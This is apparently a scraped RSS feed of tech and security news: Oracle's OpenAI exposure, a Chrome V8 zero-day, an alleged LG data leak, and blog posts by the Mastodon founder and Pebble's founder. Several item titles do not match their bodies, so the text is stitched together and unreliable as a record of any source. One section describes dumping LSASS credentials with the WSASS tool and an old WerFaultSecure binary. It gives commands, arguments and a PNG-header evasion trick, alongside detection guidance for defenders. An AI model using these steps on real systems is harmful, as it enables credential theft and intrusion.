Since September 10, when Oracle announced a $300bn deal with the chatbot maker, its stock has shed $315bn* in market value:OK, yes, it’s a gross simplification to just look at market cap. But equivalents to Oracle shares are little changed over the same period (Nasdaq Composite, Microsoft, Dow Jones US Software Index), so the $60bn loss figure is not entirely wrong. Oracle’s “astonishing quarter” really has cost it nearly as much as one General Motors, or two Kraft Heinz.Investor unease stems from Big Red betting a debt-financed data farm on OpenAI, as MainFT reported last week. We’ve nothing much to add to that report other than the below charts showing how much Oracle has, in effect, become OpenAI’s US public market proxy: The theory goes that OpenAI is in a rush to  discover AGI, and Oracle is uniquely able to scale the compute capacity it needs. Oracle promises the lowest upfront costs and fastest path to income generation among the hyperscalers because it’s a data centre tenant rather than the landlord. Alternatively, Oracle doesn’t have as much operating profit to burn as its competitors, so is throwing everything it can at supporting its one big customer in exchange for an IOU:At an analyst day last month in Las Vegas, Oracle said it was aiming for cloud computing revenue of $166bn by 2030:To get there, Oracle’s capex budget for the current financial year ending May is $35bn. The consensus has annual capex levelling out at around $80bn a year in 2029, after which revenues continue to ramp:And from 2027, the majority of revenue would be coming from OpenAI:But Oracle’s net debt is already at 2.5 times ebitda, having more than doubled since 2021, and it’s expected to nearly double again by 2030. Cash flow is forecast to remain negative for five straight years:So while the OpenAI agreement has been more than written off the equity, the risk of unfunded expansion remains and the cost of hedging Oracle debt is at a three-year high. Beyond the charts, a broader question relates to whether an OpenAI deal is still worth announcing. A few months ago, any kind of agreement with OpenAI could make a share price go up. OpenAI did very nicely out of its power to reflect glory, most notably in October when it took AMD warrants as part of a chip deal that bumped share price by 24 per cent.But Oracle is not the only laggard. Broadcom and Amazon are both down following OpenAI deal news, while Nvidia’s barely changed since its investment agreement in September. Without a share price lift, what’s the point? A combined trillion dollars of AI capex might look like commitment, but investment fashions are fickle.* Calculation and graph updated at 11am GMT for shares outstanding, and text tweaked at 2pm GMT to reflect a less clickbait headline]]></content:encoded></item><item><title>CVE-2025-63228 - Mozart FM Transmitter Unauthenticated Remote Code Execution File Upload Vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-63228</link><author></author><category>vulns</category><pubDate>Tue, 18 Nov 2025 20:15:48 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-63228

Over the course of my time at Mastodon, I have centered myself less and less in our outward communications, and to some degree, this is the culmination of that trend. Mastodon is bigger than me, and though the technology we develop on is itself decentralized—with heaps of alternative fediverse projects demonstrating that participation in this ecosystem is possible without our involvement—it benefits our community to ensure that the project itself which so many people have come to love and depend on remains true to its values. There are too many examples of founder egos sabotaging thriving communities, and while I’d like to think myself an exception, I understand why people would prefer better guardrails.But it would be uncouth for me to pretend that there isn’t some self-interest involved. Being in charge of a social media project is, turns out, quite the stressful endeavour, and I don’t have the right personality for it. I think I need not elaborate that the passion so many feel for social media does not always manifest in healthy ways. You are to be compared with tech billionaires, with their immense wealth and layered support systems, but with none of the money or resources. It manifests in what people expect of you, and how people talk about you. I remember somebody jokingly suggesting that I challenge Elon Musk to a fight (this was during his and Mark Zuckerberg’s martial arts feud), and quietly thinking to myself, I am literally not paid enough for that. I remember also, some Spanish newspaper article that for some reason, concluded that I don’t dress as fashionably as Jeff Bezos, based on the extremely sparse number of pictures of myself I have shared on the web. Over an entire decade, these tiny things chip away at you slowly. Some things chip faster. I steer clear of showing vulnerability online, but there was a particularly bad interaction with a user last summer that made me realise that I need to take a step back and find a healthier relationship with the project, ultimately serving as the impetus to begin this restructuring process.As for what the legacy of my run will be, I find hard to answer. For one, I think it is not up for me to judge. On the other hand, it is as much about what didn’t happen as it is about what did. I’ve always thought that one of the most important responsibilities I had was to say “no”. It is not a popular thing to do, nor is it a fun thing to do, but being pulled into too many different directions at once can spell disaster for any project. I’d like to think I avoided some trouble by being careful. But I’m also aware that my aversion to public appearances cost Mastodon some opportunities in publicity. Ultimately, while I cannot take sole credit for it, I am nevertheless most proud of how far we’ve made it over these last 10 years. From the most barebones project written out of my childhood bedroom, to one of the last remaining and thriving pieces of the original, community-centred internet.I have so much passion for Mastodon and the fediverse. The fediverse is an island within an increasingly dystopian capitalist hellscape. And from my perspective, Mastodon is our best shot at bringing this vision of a better future to the masses. This is why I’m sticking around, albeit in a more advisory, and less public, role.]]></content:encoded></item><item><title>Chrome zero-day under active attack: visiting the wrong site could hijack your browser</title><link>https://www.malwarebytes.com/blog/news/2025/11/chrome-zero-day-under-active-attack-visiting-the-wrong-site-could-hijack-your-browser</link><author></author><category>threatintel</category><pubDate>Tue, 18 Nov 2025 18:09:13 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Google has released an update for its Chrome browser that includes two security fixes. Both are classified as high severity, and one is reportedly exploited in the wild. These flaws were found in Chrome’s V8 engine, which is the part of Chrome (and other Chromium-based browsers) that runs JavaScript.Chrome is by far the world’s most popular browser, used by an estimated 3.4 billion people. That scale means when Chrome has a security flaw, billions of users are potentially exposed until they update.These vulnerabilities are serious because they affect the code that runs almost every website you visit. Every time you load a page, your browser executes JavaScript from all sorts of sources, whether you notice it or not. Without proper safety checks, attackers can sneak in malicious instructions that your browser then runs—sometimes without you clicking anything. That could lead to stolen data, malware infections, or even a full system compromise.That’s why it’s important to install these patches promptly. Staying unpatched means you could be open to an attack just by browsing the web, and attackers often exploit these kinds of flaws before most users have a chance to update. Always let your browser update itself, and don’t delay restarting to apply security patches, because updates often fix exactly this kind of risk.The Chrome update brings the version number to 142.0.7444.175/.176 for Windows, 142.0.7444.176 for macOS and 142.0.7444.175 for Linux. So, if your Chrome is on the version number  it’s protected from these vulnerabilities.The easiest way to update is to allow Chrome to update automatically, but you can end up lagging behind if you never close your browser or if something goes wrong—such as an extension stopping you from updating the browser.To update manually, click the “” menu (three stacked dots), then choose  > . If there is an update available, Chrome will notify you and start downloading it. Then relaunch Chrome to complete the update, and you’ll be protected against these vulnerabilities.Both vulnerabilities are characterized as “type confusion” flaws in V8.Type confusion happens when code doesn’t verify the object type it’s handling and then uses it incorrectly. In other words, the software mistakes one type of data for another—like treating a list as a single value or a number as text. This can cause Chrome to behave unpredictably and, in some cases, let attackers manipulate memory and execute code remotely through crafted JavaScript on a malicious or compromised website.The actively exploited vulnerability—Google says “an exploit for CVE-2025-13223 exists in the wild”—was discovered by Google’s Threat Analysis Group (TAG). It can allow a remote attacker to exploit heap corruption via a malicious HTML page. Which means just visiting the “wrong” website might be enough to compromise your browser.Google hasn’t shared details yet about who is exploiting the flaw, how they do it in real-world attacks, or who’s being targeted. However, the TAG team typically focuses on spyware and nation-state attackers that abuse zero days for espionage.The second vulnerability, tracked as CVE-2025-13224, was discovered by Google’s Big Sleep, an AI-driven project to discover vulnerabilities. It has the same potential impact as the other vulnerability, but cybercriminals probably haven’t yet figured out how to use it.Users of other Chromium-based browsers—like Edge, Opera, and Brave—can expect similar updates in the near future.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Surveillance tech provider Protei was hacked, its data stolen, and its website defaced</title><link>https://databreaches.net/2025/11/18/surveillance-tech-provider-protei-was-hacked-its-data-stolen-and-its-website-defaced/?pk_campaign=feed&amp;pk_kwd=surveillance-tech-provider-protei-was-hacked-its-data-stolen-and-its-website-defaced</link><author>Dissent</author><category>databreach</category><pubDate>Tue, 18 Nov 2025 17:44:49 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Google Chrome bug exploited as an 0-day - patch now or risk full system compromise</title><link>https://go.theregister.com/feed/www.theregister.com/2025/11/18/google_chrome_seventh_0_day/</link><author></author><category>security</category><pubDate>Tue, 18 Nov 2025 17:43:13 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

We love our Pebbles and want them to keep working long into the future. We love the community that has sprung up around Pebble, and how it’s persevered - next year will be the 14th anniversary of the original Kickstarter campaign!But I have to respond to claims made by Rebble posted on their blog yesterday. I will link to their post so you can read their side of the story, and I’ve asked them to link back to this blog post from theirs.Look - I’m the first person to call myself out when I fail. I wrote a detailed blog post about Success and Failure at Pebble and often write in detail about learning from my mistakes. But in this specific case, you’ll find that I’ve done my utmost to respect the Pebble legacy and community. Rebble is misleading the community with false accusations.For those just passing through, here’s the TLDR:Core Devices is a small company I started in 2025 to relaunch Pebble and build new Pebble smartwatches. Rebble is a non-profit organization that has supported the Pebble community since 2017. Rebble has done a ton of great work over the years and deserves recognition and support for that.Core Devices and Rebble negotiated an agreement where Core would pay $0.20/user/month to support Rebble services. But the agreement broke down after over the following disagreement. Rebble believes that they ‘100%’ own the data of the Pebble Appstore. They’re attempting to create a walled garden around 13,000 apps and faces that individual Pebble developers created and uploaded to the Pebble Appstore between 2012 and 2016. Rebble later scraped this data in 2017. I disagree. I’m working hard to keep the Pebble ecosystem open source. I believe the contents of the Pebble Appstore should be freely available and not controlled by one organization. Rebble posted a blog post yesterday with a bunch of false accusations, and in this post I speak to each of them. - . Some IP was sold to Fitbit. I blogged about why I think we failed. Fitbit continued to run the Pebble Appstore and web services for 1.5 years. I really appreciated that.Rebble organization grew out of the official Pebble Developers Discord., Fitbit shut down the Pebble appstore.Before it shut down, Rebble (and others) scraped all 13,000 apps and metadata from the Pebble Appstore. Rebble began hosting a copy of the appstore. They created a new Dev Portal where developers could upload new apps, roughly 500 have been uploaded since July 2018.Rebble also reverse engineered many Pebble web services (weather, timeline and voice transcription) and provided them as a paid service for the Pebble community. - Google open sourced PebbleOS, breathing new life into the community. - we finished shipping out 5,000 Pebble 2 Duos. We’re working hard on Pebble Time 2. We’re aiming to start shipping in January.: ‘Rebble paid for the work that [Eric] took as a base for his commercial watches’I think they’re accusing me of ‘stealing’ open source contributions to PebbleOS that Rebble paid for. This is entirely false.We did not take any PebbleOS workRebble paid for ‘as a base for [our] commercial watches’.  Update: I’m told Rebble did pay him, months later. My point is valid - when we shifted development to our repo, Rebble had not paid anything. More broadly, I reject the premise that using open source software under the terms of the license, regardless of who funds development, is ‘stealing’.We started using our own repo for PebbleOS development because PRs on the Rebble repo reviews were taking too long. We only had one firmware engineer at the time (now we have a whopping 2!) and he felt like he was being slowed down too much. All of our contributions to PebbleOS have been 100% open source.Overall, the feedback that PebbleOS could benefit from open governance is well taken. Long term, PebbleOS would be a good fit for open source organization with experience in open governance, like Apache or Linux Foundation. I wrote about this last week.With our small team and fairly quick development schedule, it's true that we haven't PRed  our changes into Rebble’s repo. It’s tough to prioritize this while we are busy fixing bugs and getting ready for Pebble Time 2.The majority (>90%) of our new open source library was written by Core Devices employees.  The remainder comes from , another open source library written by two people.In April 2025, Core purchased the copyright to thecode from the two maintainers and incorporated it into, which is also open source.All our contributions to  are GPL-3.0 licensed. Here’s the motivation behind that our licensing strategy for this repo. We use the same CLA agreement as Matrix, QT and MySQL. Our CLA explicitly includes a clause that requires to Core Devices to distribute all contributions under an OSI-compatible FOSS license (e.g. GPLv3).Note that neither Rebble  maintainer signed the Rebble blog post.Side note regarding Cobble, I don’t think Rebble even knows this but in 2024, I personally spent over $30,000 to support its development, way before PebbleOS was open source. It was my own way to support the community.Core promised that they would let Rebble maintain and own the developer site’Nothing of the sort was agreed upon. See the full  that Core Devices has with Rebble towards the bottom. Rebble agreed that Core would host the developer site.I have been maintaining and updating the developer site personally - all open source. Having two sources of truth would be confusing for the community. scraped our app store, in violation of the agreement that we reached with him previously’means to automated extraction of data from a website.Here’s what happened. I wanted to highlight some of my favourite watchfaces on the Pebble Appstore. Last Monday Nov 10, after I put my kids to sleep and between long calls with factories in Asia, I started building a webapp to help me quickly go through Pebble Appstore and decide which were my top picks.Let me be crystal clear - my little webapp did not download apps or ‘scrape’ anything from Rebble. The webapp displayed the name of each watchface and screenshots and let me click on my favs. I  used it to manually look through 6000 watchfaces with my own eyes. I still have 7,000 to go. Post your server logs, they will match up identically to the app I (well…Claude) wrote (source code here)All of four of these accusations could have been clarified simply by asking me. Instead, Rebble decided to post them on their blog and threaten a lawsuit. Why are there dueling blog posts in the Pebbleverse? I think most of the people are behind Rebble are great and the community overall is awesome. I know they truly mean well, but there are many aspects of the org that are severely troubling. I am very close with one of the Rebble board members, who I consider a personal friend. Over the years, I learned a lot about the organization and helped coach him through some major disputes between board members. I exchanged literally thousands of messages with my friend on this topic over the span of 3 years. I refrained from getting too involved, despite being asked several times to join Rebble as a board member or lead the organization. I demurred - I saw how painful it was for him and I had no interest in being part of that. Core Devices + Rebble: 2025PebbleOS is now open source! Yay. This is thanks to the work of many Googlers, ex-Pebblers and others - I called out (hopefully) all of them in my blog post in March. I really wanted Rebble to be a part of the Pebble revival going forward. I hired 3 people from Rebble to join Core Devices. I regularly brought up Rebble’s efforts over the years.I engaged with Rebble folks in discussions in the spring on how we could formally work together, and then made some concrete proposals in the summer. One difficulty was that Core Devices is a business with customers and schedules. This didn’t always sync up with the timeframes of a non-profit. Things became very drawn out. It was very hard to pin people down, even on simple stuff like what the goals of Rebble as an organization were. Regardless, I continued pushing to make Rebble a key part of the Pebble relaunch.By August, we finally got close to an agreement.On September 30 2025, we agreed to the following document and published respective blog posts (ours, theres). Core Devices would pay Rebble $0.20/user/month. I considered it a donation to a group that has done so much to support the community. But I purposely pushed for openness - no single group (Core Devices or Rebble) should be in control. Notice the final bullet in the App store section: All binary/metadata (including historical apps) will be published as archive file (no scraping Rebble services) Looking back, we should have had more clear wording in this agreement. But this was after months of chat discussions and hours of Zoom calls. I honestly thought that we had reached an agreement to make the archive open, like in this message I received from a Rebble board member.By the end of October, Rebble has changed their mind about providing an archive file.Not withstanding their false accusations of theft, the crux of our disagreement is the archive of 13,000 Pebble apps and watchfaces that were uploaded to the Pebble Appstore in July 2018 before it was shut down. I believe that these apps and watchfaces should be archived publicly and freely accessible by anyone. They should not held behind a walled garden by one organization. I repeatedly advocated for hosting this data on a neutral 3rd party like Archive.org.Rebble believes ‘the data behind the Pebble App Store is 100% Rebble’ (this is a direct quote from their blog post). They repeatedly refer to all watchfaces and watchapps as ‘our data’.This is just plainly false. The apps and watchfaces were originally uploaded by individual developers to an appstore run by a company that no longer exists. These folks created beautiful work and shared them freely with the Pebble community. I’ve spoken with numerous Pebble app developers about this. After the fall of Pebble Tech Corp, none of them envisioned one single organization claiming ownership of their work and restricting access, or charging money for access.Let’s do the right thing - honour the original developers and create a free publicly available archive of their beautiful watchfaces and watchapps. It's easy to assume the worst in situations like this. But our plan for the appstore is pretty straightforward. We’re working on rewriting the appstore frontend to be native in the mobile app rather than a web view. Rebble’s appstore backend API will be the data source. Rebble’s dev portal is where developers upload apps. No subscription or Rebble account will not be required to download apps. We intend to curate how the appstore is displayed Pebble app.We’re excited to see other Pebble-supporting mobile apps pop up - like MicroPebble and GadgetBridge, offering different features and experiences. We’d love to support these efforts with open source code or financially.Reading things like ‘We’re happy to let them build whatever they want as long as it doesn’t hurt Rebble’ in their blog post worries me. Take our voice-to-text and weather features. Rebble currently offers these as part of their paid subscription. Our new Pebble mobile app includes a on-device speech-to-text feature. We’re planning to include weather for free in our app and make the data available to all watchfaces so you don’t need to configure each one separately. These features are better for users but would they ‘hurt’ Rebble? Will I need to ask permission from Rebble before building these features? It’s clear that the goals of a non-profit and device manufacturer will not always be in alignment.Now consider the appstore. It’s a fundamental part of the Pebble experience. Even before yesterday’s accusations, I felt wary about relying too heavily on a 3rd party like Rebble to provide such a critical service. When people buy a watch from Core Devices, they expect to be able to download apps and watchfaces. If Rebble leadership changes their mind, how can I be certain I can deliver a good experience for our customers? This is one of the primary reasons I think it’s important for an archive of the Pebble Appstore to be freely available.Rebble - prove that you believe in an open, unrestricted Pebble community. Tear down the walled garden you are trying to create. Publish your copy of the Pebble Appstore archive. Stop saying that you ‘100%’ own other developers data. Let’s move on from this ridiculous sideshow and focus on making Pebble awesome!I’ve worked hard to structure everything that we’re doing to be sustainable for the long term, and to do right by the Pebble community. I think Rebble should do the same. I earned almost nothing from Pebble Tech Corp. I paid myself a $65,000 salary each year. I did not get any payout through the asset sale. I fought to make sure that all Pebble employees were taken care of as best as possible, and that the Pebble community would live on. I believe that at every turn, I’ve done right by the community.I didn’t relaunch Pebble to make a lot of money. My goal this time round is to make it sustainable. I want to continue making more watches and cool gadgets. There are no investors. I am taking huge risks doing this. I relaunched it because I love Pebble and want it to live on long into the future.

Windows are shipped with the  binary that is used by the Windows Error Reporting service, and it is signed by Microsoft to collect reports when a critical process (application or system) is crashed. The binary runs with the Windows Trusted Computing Base (WinTCB) Protected Process Light (PPL) privileges to allow interaction with other processes running with similar privileges (PPL) such as LSASS.TwoSevenOneThree disclosed that the version of  (part of Windows 8.1) enables threat actors to perform memory dump from PPL processes in a non-encrypted form. Therefore, it could be used to retrieve credentials from the LSASS process by generating a MiniDump file.The Windows process LSASS manages the authentication and credential information. Historically, the process was a target for threat actors to retrieve hashes and credentials in plain text to facilitate lateral movement activities. Endpoint Detection and Response systems have raised the bar towards credential dumping via LSASS. Any activity that interacts with this process most likely triggers an alert. In modern versions of Windows, the LSASS process is protected by PPL to prevent unauthorised interaction with the memory region unless kernel level privileges have been obtained or the interaction is performed from another process running as PPL.The  binary is signed by Microsoft and it is stored in the following Windows paths:C:\Windows\System32
C:\Windows\SysWOW64The dump file that is written on the disk during legitimate application crashes is stored encrypted. However, in the version of Windows 8.1 the binary permits the storage of the crash dump in a non-encrypted form. The tool WSASS needs to be used in conjunction with the older version of the  binary to dump the memory of the LSASS process. Specifically, the tool performs the following steps:Executes the WerFaultSecure binary with PPL protection at the WinTCB levelReplaces the dump file magic header with the PNG magic header to prevent file deletionRestores the normal operation of the LSASS processThe following diagram demonstrates the steps of LSASS credential dumping via the Windows Error Reporting.The tool requires the path of the  binary and the process ID of LSASS.shell WSASS.exe "C:\Users\Ian\Downloads\WerFaultSecure.exe" 796The MiniDump file is stored as image in a PNG format. The tool applies the PNG header to evade detection. The file could be exfiltrated for offline analysis.The first four bytes of the header MiniDump are:Hex: 4D 44 4D 50
ASCII: M D M PWith the usage of a hex editor the PNG header should be replaced with the MiniDump header.The contents of the dump could be examined via Mimikatz or any other variation such as pypykatz.pypykatz lsa minidump proc.pngIt should be noted that the technique works on Windows 10 and Windows 11 environments. However, due to credential guard implementation in Windows 11, the information that a threat actor could retrieve is limited. The high value secrets that the LSASS process used to store in its own memory have been moved into an isolated process (LSAIso.exe).The following playbook could be used to emulate the technique of LSASS dump via the Windows Error Reporting binary.[[Playbook.Windows Error Reporting]]
id = "1.0.0"
name = "1.0.0 - Windows Error Reporting"
description = "LSASS Process Dump via Windows Error Reporting"

The technique of dumping credentials cached in LSASS via the Windows Error Reporting binary provides multiple detection opportunities. It is recommended, SOC teams to investigate if their current EDR provides detection coverage especially on the behaviour level and if not enable additional logging such as Process and File Creation.Dumping the memory of LSASS via the old version of the binary  binary creates new process if the tool is executed from a console (command prompt or PowerShell) or by issuing the  command from a Command-and-Control framework (Havoc). Windows environments by default doesn’t capture process creation events. SOC teams should investigate whether it is feasible to enable Process Creation in their environments due to the volume of logs that will be generated. It should be noted that Endpoint Detection and Response systems should be also able to capture new processes. From the Group Policy the  setting is responsible to track new processes. Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Detailed TrackingThe technique requires the WSASS binary to be executed under the context of an elevated account (Local Administrator). Execution of the binary will generate a new process under the name WSASS.During the execution, the  process attempts to invoke the  binary. From defensive point of view a child process will be created under the same name. Furthermore, it should be considered an anomaly if the  process is initiated from a non-system path and has as parent the WSASS.The following SIGMA rule can detect executions of the  binary from paths outside of System32 and SysWOW64. Since the technique requires local administrator privileges, threat actors could overwrite the existing binary and initiate the execute from System32 to blend in. SOC teams should not rely only their detections on the executed path but should correlate this information with additional data sources during threat hunting. title: WerFaultSecure.exe executed outside system paths

Sysmon offers additional visibility on Process Creation events as it doesn’t only capture the process name and ID but also the command line arguments. Investigation of the command line field can disclose the arbitrary execution. Sysmon capture process creation events under Event ID 1.The WSASS tool passes undocumented arguments to the  binary that performs the dump of the LSASS process. These arguments are visible during code review of the tool:std::wstringstream cmd;
cmd << werPath
<< L" /h"
<< L" /pid " << targetPID
<< L" /tid " << targetTID
<< L" /file " << HandleToDecimal(hDump)
<< L" /encfile " << HandleToDecimal(hEncDump)
<< L" /cancel " << HandleToDecimal(hCancel)
<< L" /type 268310";
std::wstring commandLine = cmd.str();
PPLProcessCreator creator;
These arguments are also captured under Sysmon Event ID 1.The WSASS tool uses the  API to write two minidump files under the names proc.png and proce.png. The proce.png is the encrypted dump and it is being deleted from the disk to reduce traces. The only artifact that remains is the non-encrypted dump. HANDLE hDump = CreateFileW(L"proc.png", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
HANDLE hEncDump = CreateFileW(L"proce.png", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
The MiniDump header is replaced by the PNG header on the .BYTE data[4] = { 0x89, 0x50, 0x4E, 0x47 }; 
It is possible to capture file type events and build queries by enabling the subsequent subcategories from the Object Access Audit Policies:Audit Handle ManipulationComputer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object AccessSimilarly to the  events, enabling these audit policies will generate a large volume of events. Organisations are advised to ensure that sufficient storage capacity exist in their SIEM infrastructure prior of any enablement. Generation of PNG images from arbitrary processes should be considered a non-legitimate activity. During the execution of the technique the  process is invoking the vulnerable version of the  binary. The interaction of a process attempting to access another object (i.e. process, file etc.) is captured under Windows Event ID 4663.Both the  and WSASS processes are interacting with the MiniDump file. The WSASS to pass the necessary arguments to the windows error reporting binary, to ensure the right privileges are set (PPL) and to modify the file headers of the minidump and the  that conducts the memory dump of the LSASS process. Sysmon Event ID 11 can capture file creation events and could be utilised as an additional data source. The file size of the PNG image is also a strong indicator of suspicious activity on the asset. The screenshot below demonstrates that the  has a file size above 83MB that is not considered standard. Running a threat hunting query to capture image files with significant size could assist towards identification of LSASS dump via the Windows Error Reporting. DeviceFileEvents

LG Electronics has not yet issued an official statement confirming or denying these claims. The information presented is based on public reports from cybersecurity monitoring platforms. This is NOT a confirmed security breach report. For official updates, visit LG Electronics Official Website and CISA Cybersecurity Advisories. a threat actor known as “888” has allegedly dumped sensitive data purportedly stolen from electronics giant LG Electronics, raising alarms in the cybersecurity community. The breach claim, first spotlighted on November 16, 2025, allegedly includes source code repositories, configuration files, SQL databases, and critically, hardcoded credentials and SMTP server details that could potentially expose LG’s internal communications and development pipelines to widespread exploitation.The leak surfaced via a post on ThreatMon, a platform that tracks dark web activity, where “888” shared samples to prove authenticity. Described as originating from a contractor access point, the dataset reportedly spans multiple LG systems, hinting at a supply chain vulnerability rather than a direct corporate hack. Cybersecurity analysts note that hardcoded credentials embedded directly in code for convenience pose severe risks, as they could enable attackers to impersonate LG personnel or pivot to connected services. SMTP credentials, which manage email routing, might further allow phishing campaigns or spam operations disguised as legitimate LG correspondence. Threat actor “888” is no stranger to high-profile claims, having been active since at least 2024 and targeting entities like Microsoft, BMW Hong Kong, Decathlon, and Shell, often extorting ransoms or selling data on breach forums. In this LG incident, no ransom demand has been publicly confirmed. Threat actor “888” allegedly dumped sensitive LG Electronics data on November 16, 2025 via ThreatMon dark web platform Source code repositories, configuration files, SQL databases, hardcoded credentials, and SMTP server details Described as originating from a contractor access point, suggesting supply chain vulnerability Leak surfaced via ThreatMon, a dark web activity tracking platform LG Electronics has not yet issued an official statement confirming or denying these claims LG Electronics and its internal systems, development pipelines, and communications infrastructure LG’s IoT devices, consumer electronics, and smart appliances if source code exposure is confirmed Contractor networks and third-party integrations potentially exposed through contractor access point LG Uplus (LG’s telecom arm) confirmed a separate breach affecting customer data in October 2025 Millions of LG device users worldwide potentially at risk if vulnerabilities are exposed Alleged leak claim; LG Electronics has not confirmed the breach as of November 17, 2025 Hardcoded credentials could enable attackers to impersonate LG personnel or pivot to connected services Email routing credentials might allow phishing campaigns disguised as legitimate LG correspondence Source code exposure could undermine LG’s proprietary technology in consumer electronics and smart appliances Security firms urging organizations to scan for leaked credentials using tools like Have I Been PwnedLATEST UPDATE & THREAT ACTOR CLAIMS threat actor “888” posted samples of allegedly stolen LG Electronics data on ThreatMon, a platform that tracks dark web activity. The threat actor claimed to have dumped sensitive data including source code repositories, configuration files, SQL databases, hardcoded credentials, and SMTP server details. The leak was described as originating from a contractor access point, suggesting a supply chain vulnerability rather than a direct corporate hack. LG Electronics has not yet issued an official statement confirming or denying these claims. The timing aligns with a turbulent year for the company, as LG’s telecom arm, LG Uplus, confirmed a separate breach affecting customer data in October 2025, amid a wave of South Korean telecom hacks. Experts speculate these incidents may share common vectors, such as unpatched vulnerabilities in cloud integrations or third-party tools. LG Electronics Official Website the samples shared include file structures suggesting the presence of gigabytes of proprietary code, which could undermine LG’s intellectual property in consumer electronics and smart appliances if confirmed. The exposure of source code could reveal flaws in LG’s IoT devices, amplifying risks for millions of users worldwide.ATTACK DETAILS & DATA EXPOSURE ANALYSISThe alleged data leak encompasses multiple critical components of LG Electronics’ infrastructure, each posing distinct security risks:Primary Data Types Allegedly Exposed:Source Code Repositories: Proprietary code for LG’s consumer electronics, smart appliances, and IoT devices – could reveal vulnerabilities and intellectual property System configurations that could expose network architecture and security settings Database structures and potentially sensitive data schemas Authentication details embedded directly in code – severe risk for impersonation and lateral movement Email routing credentials that could enable phishing campaigns disguised as legitimate LG correspondence1. Hardcoded Credentials RiskCybersecurity analysts note that hardcoded credentials embedded directly in code for convenience pose severe risks. These credentials could enable attackers to impersonate LG personnel, access internal systems, or pivot to connected services. Once exposed, hardcoded credentials are particularly dangerous because they cannot be easily rotated without code changes and redeployment.2. SMTP Credentials ExposureSMTP (Simple Mail Transfer Protocol) credentials manage email routing and could allow threat actors to launch sophisticated phishing campaigns or spam operations disguised as legitimate LG correspondence. This could be used to target LG’s customers, partners, or employees with convincing phishing emails.3. Source Code Intellectual PropertyThe alleged exposure of source code repositories represents a significant threat to LG’s intellectual property. Proprietary code for consumer electronics, smart appliances, and IoT devices could reveal vulnerabilities, design patterns, and competitive advantages. If confirmed, this exposure could have long-term implications for LG’s market position.4. Supply Chain Entry PointThe claim that the leak originated from a contractor access point highlights the fragility of global supply chains. A single contractor’s security lapse can cascade into corporate espionage, intellectual property theft, and widespread system compromise.THREAT ACTOR “888” PROFILE & PREVIOUS ACTIVITIESThreat actor “888” is no stranger to high-profile claims, having been active since at least 2024. This individual or group has targeted numerous high-profile entities, often extorting ransoms or selling data on breach forums.Threat actor “888” profile screenshot showing previous high-profile targets including Microsoft, BMW Hong Kong, Decathlon, and Shell. The threat actor has been active since at least 2024, often extorting ransoms or selling data on breach forums. Threat actor “888” has previously claimed attacks against Microsoft, demonstrating a pattern of targeting major technology companies The threat actor has been linked to claims involving BMW Hong Kong, showing a focus on automotive and technology sectors Previous claims involving Decathlon, a major sporting goods retailer, indicate a broad targeting approach Claims involving Shell, a major energy company, demonstrate targeting of critical infrastructure sectorsThreat actor “888” typically employs tactics involving initial access brokers and infostealer malware. The group monetizes leaks through cryptocurrency payments, often extorting ransoms or selling data on breach forums. In this LG incident, no ransom demand has been publicly confirmed, suggesting the data may be sold on underground markets or used for other purposes.The history of threat actor “888” includes numerous high-profile claims, but verification of actual breaches remains challenging. Some claims may be exaggerated or fabricated to gain notoriety or extort payments. Organizations should treat all such claims with caution until verified by official sources.LG ELECTRONICS CONTEXT & PREVIOUS SECURITY INCIDENTSThe alleged LG data leak claim comes at a time when the company has faced multiple security challenges. Understanding the broader context helps assess the credibility and potential impact of these claims.LG Uplus Breach (October 2025)Earlier in October 2025, LG’s telecom arm, LG Uplus, confirmed a separate breach affecting customer data. This incident occurred amid a wave of South Korean telecom hacks, raising concerns about systemic vulnerabilities in the country’s telecommunications infrastructure. LG Uplus Official WebsiteExperts speculate that the LG Uplus breach and the alleged LG Electronics leak may share common vectors, such as unpatched vulnerabilities in cloud integrations or third-party tools. This pattern suggests that supply chain security and third-party risk management are critical areas requiring attention.South Korean Telecom SectorThe wave of South Korean telecom hacks highlights broader cybersecurity challenges facing the country’s technology sector. South Korea is home to major technology companies and has been a frequent target of state-sponsored and financially motivated cyber attacks.LG Electronics operates globally, manufacturing consumer electronics, home appliances, and IoT devices used by millions of consumers worldwide. Any confirmed breach affecting LG’s source code or credentials could have far-reaching implications for product security and customer trust.EXPERT ANALYSIS & INDUSTRY IMPACT“The exposure of source code could reveal flaws in LG’s IoT devices, amplifying risks for millions of users worldwide. Hardcoded credentials pose severe risks as they could enable attackers to impersonate LG personnel or pivot to connected services.”The alleged breach claim underscores the fragility of global supply chains, where a single contractor’s lapse can cascade into corporate espionage. This incident highlights the critical importance of third-party risk management and supply chain security assessments.Intellectual Property ProtectionIf confirmed, the exposure of source code repositories represents a significant threat to intellectual property protection. Proprietary code contains trade secrets, design patterns, and competitive advantages that could be exploited by competitors or nation-state actors.Credential Management Best PracticesThe alleged exposure of hardcoded credentials serves as a reminder of the importance of proper credential management. Organizations should avoid hardcoding credentials in source code and instead use secure credential management systems, environment variables, or secrets management solutions.Incident Response ReadinessAs investigations unfold, security firms urge organizations to scan for leaked credentials using tools like Have I Been Pwned and to rotate all suspected keys immediately. This proactive approach can help mitigate the impact of credential exposure even before official confirmation.SUPPLY CHAIN SECURITY IMPLICATIONSThe claim that the alleged LG data leak originated from a contractor access point highlights critical supply chain security challenges facing modern organizations.Third-Party Risk ManagementOrganizations increasingly rely on contractors, vendors, and third-party service providers, creating an expanded attack surface. A single contractor’s security lapse can provide threat actors with a pathway into corporate networks, as allegedly occurred in this LG incident.Access Control and MonitoringThe alleged breach claim emphasizes the importance of strict access controls and continuous monitoring of third-party access. Organizations should implement least-privilege access principles, regularly audit contractor permissions, and monitor for anomalous 